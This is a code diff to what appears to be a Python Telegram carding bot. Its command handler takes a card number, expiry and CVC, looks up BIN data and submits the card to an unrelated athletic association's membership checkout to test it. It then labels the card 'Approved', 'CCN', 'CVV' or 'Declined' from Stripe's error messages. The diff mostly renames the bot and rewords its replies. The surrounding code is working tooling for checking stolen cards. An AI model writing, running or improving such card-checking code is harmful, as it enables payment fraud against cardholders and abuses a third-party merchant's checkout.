@@ -60,7 +60,7 @@ def sp_cmd(client, message):
             cvc = splitter[3]
             ab  = ccn[0:6]
             
-            wait = message.reply("**> Wait For Results...\n>--Result--: 0%\nGate: Stripe Auth**", reply_to_message_id=message.message_id)
+            wait = message.reply("**>> Wait For Results...\n🚪: Stripe Auth**", reply_to_message_id=message.message_id)
             #####################################################################
             try:
                 bin = requests.get(f"https://bins-ws-api.deta.dev/api/{ccn}").json()
@@ -114,8 +114,6 @@ def sp_cmd(client, message):
                 took = kya.elapsed.total_seconds()
                 stook = str(took)
 
-                wait.edit("**> Wait For Results...\n>--Result--: 50%\nGate: Stripe Auth**", reply_to_message_id=message.message_id)
-
                 url2 = 'https://www.ricsathleticassociation.com/membership-account/membership-checkout/?level=6/'
 
                 headers2 = {
@@ -166,15 +164,15 @@ def sp_cmd(client, message):
                 took = hm.elapsed.total_seconds()
                 took = str(took)
                 if "Your card's security code is incorrect." in ok or "Your card&#039;s security code is incorrect" in ok or "Your card\u0027s security code is incorrect." in ok:
-                  wait.edit(f"**INPUT: `{cc}|@CardChkBot`**\n--Status--: **Approved ✅**\n--Result--: **CCN!** [__Your card's security code is incorrect.__]\n--Gate--: **Stripe Auth** (Public)\n\n**BinData**: `{ab} - {vendor} - {type} - {level} - {bank} - {country} - {flag}`\n\n--Time--: **{took}**\n**Checked By {fname}**")
+                  wait.edit(f"**INPUT: `{cc}|@ZenitsuChkBot`**\n--Status--: **Approved ✅**\n--Result--: **CCN!** [__Your card's security code is incorrect.__]\n--Gate--: **Stripe Auth** (Public)\n\n**BinData**: `{ab} - {vendor} - {type} - {level} - {bank} - {country} - {flag}`\n\n--Time--: **{took}**\n**Checked By {fname}**")
                 elif "Your card has insufficient funds." in ok:
-                  wait.edit(f"**INPUT: `{cc}|@CardChkBot`**\n--Status--: **Approved ✅**\n--Result--: **CVV!** [__Your card has insufficient fund.__]\n--Gate--: **Stripe Auth** (Public)\n\n**BinData**: `{ab} - {vendor} - {type} - {level} - {bank} - {country} - {flag}`\n\n--Time--: **{took}**\n**Checked By {fname}**")
+                  wait.edit(f"**INPUT: `{cc}|@ZenitsuChkBot`**\n--Status--: **Approved ✅**\n--Result--: **CVV!** [__Your card has insufficient fund.__]\n--Gate--: **Stripe Auth** (Public)\n\n**BinData**: `{ab} - {vendor} - {type} - {level} - {bank} - {country} - {flag}`\n\n--Time--: **{took}**\n**Checked By {fname}**")
                 elif "Your card was declined." in ok:
-                  wait.edit(f"**INPUT: `{cc}|@CardChkBot`**\n--Status--: **Declined ❌**\n--Result--: **Declined!** [__Your card was declined__]\n--Gate--: **Stripe Auth** (Public)\n\n**BinData**: `{ab} - {vendor} - {type} - {level} - {bank} - {country} - {flag}`\n\n--Time--: **{took}**\n**Checked By {fname}**")
+                  wait.edit(f"**INPUT: `{cc}|@ZenitsuChkBot`**\n--Status--: **Declined ❌**\n--Result--: **Declined!** [__Your card was declined__]\n--Gate--: **Stripe Auth** (Public)\n\n**BinData**: `{ab} - {vendor} - {type} - {level} - {bank} - {country} - {flag}`\n\n--Time--: **{took}**\n**Checked By {fname}**")
                 else:
-                  wait.edit(f"**INPUT: `{cc}|@CardChkBot`**\n--Status--: **Declined ❌**\n--Result--: **Declined!** [__Your card was declined__]\n--Gate--: **Stripe Auth** (Public)\n\n**BinData**: `{ab} - {vendor} - {type} - {level} - {bank} - {country} - {flag}`\n\n--Time--: **{took}**\n**Checked By {fname}**")
+                  wait.edit(f"**INPUT: `{cc}|@ZenitsuChkBot`**\n--Status--: **Declined ❌**\n--Result--: **Declined!** [__Generic decline__]\n--Gate--: **Stripe Auth** (Public)\n\n**BinData**: `{ab} - {vendor} - {type} - {level} - {bank} - {country} - {flag}`\n\n--Time--: **{took}**\n**Checked By {fname}**")
             except Exception as e:
-                wait.edit(f"**INPUT: `{cc}|@CardChkBot`**\n--Status--: **Declined ❌**\n--Result--: **Declined!** [__Card Error__]\n--Gate--: **Stripe Auth** (Public)\n\n**BinData**: `{ab} - {vendor} - {type} - {level} - {bank} - {country} - {flag}`\n\n--Time--: **Instantly**\n**Checked By {fname}**")
+                wait.edit(f"**INPUT: `{cc}|@ZenitsuChkBot`**\n--Status--: **Declined ❌**\n--Result--: **Declined!** [__Card Error__]\n--Gate--: **Stripe Auth** (Public)\n\n**BinData**: `{ab} - {vendor} - {type} - {level} - {bank} - {country} - {flag}`\n\n--Time--: **Instantly**\n**Checked By {fname}**")
                  
 
 
